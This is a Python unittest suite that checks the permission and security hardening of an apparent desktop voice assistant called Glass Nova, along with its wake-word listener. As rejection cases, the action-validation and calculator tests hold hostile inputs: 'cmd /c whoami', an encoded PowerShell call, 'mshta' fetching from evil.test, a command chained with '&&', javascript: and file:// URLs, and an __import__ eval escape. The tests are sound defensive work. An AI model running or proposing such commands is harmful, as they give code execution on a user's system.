"""Security audit and reliability test suite for Glass Nova.

Verifies:
1. Fail-closed permission enforcement (no bypass when prompt_callback is None)
2. File operation, clipboard, and safe calculator permissions/hardening
3. Action validation, allow-list enforcement, URL scheme & shell-injection blocking
4. Screen viewing, continuous observation, and desktop control permission enforcement
5. Wake-word listener lifecycle, handover, duplicate prevention, and error recovery
"""
import os
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

ROOT = Path(__file__).resolve().parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))
os.environ.setdefault("GEMINI_API_KEY", "dummy-key-for-unit-tests")

from permissions import permissions
import tools
import tools_state
import tools_files
import screen_agent
import desktop_agent
from nova_action_router import ApprovedActionBroker, validate_proposed_action
from wake_word import WakeWordListener


class PermissionFailClosedTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_check_perm_fails_closed_without_callback(self):
        """Missing prompt_callback must NEVER silently grant permissions."""
        self.assertIsNone(permissions.prompt_callback)
        self.assertFalse(tools_state._check_perm("file_modify", "Create folder"))
        self.assertFalse(tools_state._check_perm("file_delete", "Delete file"))
        self.assertFalse(tools_state._check_perm("mouse_keyboard", "Click mouse"))
        self.assertFalse(tools_state._check_perm("screen_view", "Take screenshot"))
        self.assertFalse(tools_state._check_perm("document_access", "Read file"))

    def test_check_perm_honors_explicit_deny_and_allow_session(self):
        permissions.set_prompt_callback(lambda cat, desc, det: "deny")
        self.assertFalse(tools_state._check_perm("file_modify", "Create folder"))
        self.assertFalse(permissions.is_granted("file_modify"))

        permissions.set_prompt_callback(lambda cat, desc, det: "allow_session")
        self.assertTrue(tools_state._check_perm("file_modify", "Create folder"))
        self.assertTrue(permissions.is_granted("file_modify"))

    def test_always_prompt_categories_cannot_bypass_without_callback(self):
        """file_delete, form_purchase, continuous_screen must always require an active prompt."""
        for cat in ("file_delete", "form_purchase", "continuous_screen"):
            permissions.grant_session(cat)
            permissions.set_prompt_callback(None)
            self.assertFalse(
                tools_state._check_perm(cat, f"Test {cat}"),
                f"Category '{cat}' bypassed fail-closed check when prompt_callback is None",
            )


class FileAndClipboardPermissionTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_file_modify_and_read_denied_without_permission(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            sub = str(Path(tmpdir) / "new_dir")
            f1 = Path(tmpdir) / "a.txt"
            f1.write_text("hello", encoding="utf-8")

            # All mutating file operations fail closed when no callback/grant exists
            self.assertFalse(tools_files.create_folder(sub)["ok"])
            self.assertFalse(Path(sub).exists())
            self.assertFalse(tools_files.rename_file(str(f1), "b.txt")["ok"])
            self.assertTrue(f1.exists())
            self.assertFalse(tools_files.copy_file(str(f1), str(Path(tmpdir) / "c.txt"))["ok"])
            self.assertFalse(tools_files.move_file(str(f1), str(Path(tmpdir) / "d.txt"))["ok"])
            self.assertFalse(tools_files.write_text_file("audit_test.txt", "secret")["ok"])

            # read_text_file requires document_access
            r_read = tools_files.read_text_file("audit_test.txt")
            self.assertFalse(r_read["ok"])
            self.assertTrue(r_read.get("permission_denied"))

            # list_folder remains usable without unnecessary permission prompts
            r_list = tools_files.list_folder(tmpdir)
            self.assertTrue(r_list["ok"])

            # clipboard_control requires mouse_keyboard
            r_clip = tools_files.clipboard_control("read")
            self.assertFalse(r_clip["ok"])
            self.assertTrue(r_clip.get("permission_denied"))

    def test_file_modify_and_delete_succeed_only_when_authorized(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            sub = Path(tmpdir) / "allowed_dir"
            f1 = sub / "sample.txt"
            f2 = sub / "renamed.txt"

            permissions.set_prompt_callback(lambda cat, desc, det: "allow_session" if cat == "file_modify" else "deny")
            self.assertTrue(tools_files.create_folder(str(sub))["ok"])
            self.assertTrue(sub.is_dir())

            f1.write_text("content", encoding="utf-8")
            self.assertTrue(tools_files.rename_file(str(f1), "renamed.txt")["ok"])
            self.assertTrue(f2.exists())

            # delete_file without confirm=True must ask for confirmation
            r_no_confirm = tools_files.delete_file(str(f2), confirm=False)
            self.assertFalse(r_no_confirm["ok"])
            self.assertTrue(r_no_confirm.get("confirmation_required"))
            self.assertTrue(f2.exists())

            # delete_file with confirm=True but denied file_delete permission must NOT delete
            r_denied_del = tools_files.delete_file(str(f2), confirm=True)
            self.assertFalse(r_denied_del["ok"])
            self.assertTrue(f2.exists())

            # delete_file with confirm=True AND approved file_delete permission succeeds
            permissions.set_prompt_callback(lambda cat, desc, det: "once" if cat == "file_delete" else "deny")
            r_ok_del = tools_files.delete_file(str(f2), confirm=True)
            self.assertTrue(r_ok_del["ok"])
            self.assertFalse(f2.exists())

    def test_safe_calculator_without_eval(self):
        self.assertEqual(tools_files.calculator_operation("25 * 4")["result"], 100)
        self.assertEqual(tools_files.calculator_operation("2 to the power of 8")["result"], 256)
        self.assertFalse(tools_files.calculator_operation("9 ** 999")["ok"])
        self.assertFalse(tools_files.calculator_operation("__import__('os').system('calc')")["ok"])


class ActionExecutionSecurityTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_validate_proposed_action_blocks_dangerous_commands_and_schemes(self):
        bad_actions = [
            {"action": "open_app", "arguments": {"app": "cmd /c whoami"}},
            {"action": "open_app", "arguments": {"app": "powershell -enc AAA"}},
            {"action": "open_app", "arguments": {"app": "mshta http://evil.test"}},
            {"action": "open_app", "arguments": {"app": "notepad && calc"}},
            {"action": "open_url", "arguments": {"url": "javascript:alert(1)"}},
            {"action": "open_url", "arguments": {"url": "file:///C:/Windows/System32/cmd.exe"}},
            {"action": "volume_control", "arguments": {"action": "set", "value": 999}},
            {"action": "unknown_shell_exec", "arguments": {"cmd": "dir"}},
        ]
        for act in bad_actions:
            valid, _reason = validate_proposed_action(act)
            self.assertFalse(valid, f"Expected action to be rejected: {act}")

        # Legitimate actions remain valid
        self.assertTrue(validate_proposed_action({"action": "open_app", "arguments": {"app": "notepad"}})[0])
        self.assertTrue(validate_proposed_action({"action": "open_url", "arguments": {"url": "https://example.com"}})[0])
        self.assertTrue(validate_proposed_action({"action": "volume_control", "arguments": {"action": "set", "value": 50}})[0])

    def test_broker_rejects_unlisted_action_even_if_registered(self):
        broker = ApprovedActionBroker(approval=lambda _a: True)
        called = []
        broker.register("secret_shell_tool", lambda **kw: called.append(kw))
        res = broker.execute({"action": "secret_shell_tool", "arguments": {}})
        self.assertFalse(res["ok"])
        self.assertEqual(called, [])

    def test_open_url_and_window_app_control_enforce_security_directly(self):
        self.assertFalse(tools.open_url("javascript:alert(1)")["ok"])
        self.assertFalse(tools.open_url("file:///C:/Windows/win.ini")["ok"])

        r_win = tools.window_control("minimize")
        self.assertFalse(r_win["ok"])
        self.assertTrue(r_win.get("permission_denied"))

        r_app = tools.app_control("close", "notepad")
        self.assertFalse(r_app["ok"])
        self.assertTrue(r_app.get("permission_denied"))


class ScreenAndDesktopPermissionTests(unittest.TestCase):
    def setUp(self):
        self._orig_cb = permissions.prompt_callback
        permissions.revoke_all()
        permissions.set_prompt_callback(None)

    def tearDown(self):
        permissions.revoke_all()
        permissions.set_prompt_callback(self._orig_cb)

    def test_screen_and_continuous_monitoring_require_permissions(self):
        r_view = screen_agent.analyze_screen("What is on screen?", continuous=False)
        self.assertFalse(r_view["ok"])
        self.assertTrue(r_view.get("permission_denied"))

        # Even if screen_view is granted, continuous_screen must still require its own approval
        permissions.grant_session("screen_view")
        r_cont = screen_agent.analyze_screen("Watch my screen", continuous=True)
        self.assertFalse(r_cont["ok"])
        self.assertTrue(r_cont.get("permission_denied"))

        # Direct region analysis fails closed when screen_view is revoked
        permissions.revoke_all()
        with self.assertRaises(PermissionError):
            screen_agent.analyze_region_bytes(b"\xff\xd8\xff", "Explain this")

        # take_screenshot fails closed without screen_view
        self.assertFalse(tools.take_screenshot()["ok"])

    def test_desktop_actions_fail_closed_without_mouse_keyboard_permission(self):
        self.assertTrue(desktop_agent.click_element("OK").get("permission_denied"))
        self.assertTrue(desktop_agent.type_text_into_ui("hello").get("permission_denied"))
        self.assertTrue(desktop_agent.press_keyboard_hotkey("ctrl+c").get("permission_denied"))
        self.assertTrue(desktop_agent.scroll_desktop("down", 3).get("permission_denied"))
        self.assertTrue(desktop_agent.write_in_notepad("hello").get("permission_denied"))
        self.assertTrue(desktop_agent.close_browser_tab("youtube").get("permission_denied"))


class WakeWordLifecycleTests(unittest.TestCase):
    def test_cooldown_and_duplicate_prevention(self):
        wl = WakeWordListener()
        self.assertTrue(wl._check_wake_text("hey nova open calculator"))
        self.assertEqual(wl.last_command, "open calculator")
        # Immediate duplicate must be suppressed by cooldown
        self.assertFalse(wl._check_wake_text("hey nova open calculator"))

    def test_error_backoff_and_clean_stop(self):
        statuses = []
        wl = WakeWordListener(on_status_change=statuses.append)
        fake_rec = MagicMock()
        wl._model = object()
        wl._recognizer = fake_rec

        attempts = {"n": 0}

        class FakeStream:
            def __init__(self, *args, **kwargs):
                attempts["n"] += 1
                if attempts["n"] <= 2:
                    raise OSError("Simulated mic busy")

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

        with patch("wake_word.sd.RawInputStream", FakeStream), \
             patch.object(wl, "_set_ducker_listening"):
            wl.start()
            deadline = time.monotonic() + 3.5
            while "listening" not in statuses and time.monotonic() < deadline:
                time.sleep(0.05)
            self.assertIn("error", statuses)
            self.assertIn("listening", statuses)

            wl.pause(wait_timeout=0.5)
            self.assertFalse(wl._stream_active.is_set())
            wl.stop()
            self.assertEqual(wl.status, "stopped")
            self.assertIsNone(wl._thread)


if __name__ == "__main__":
    unittest.main()
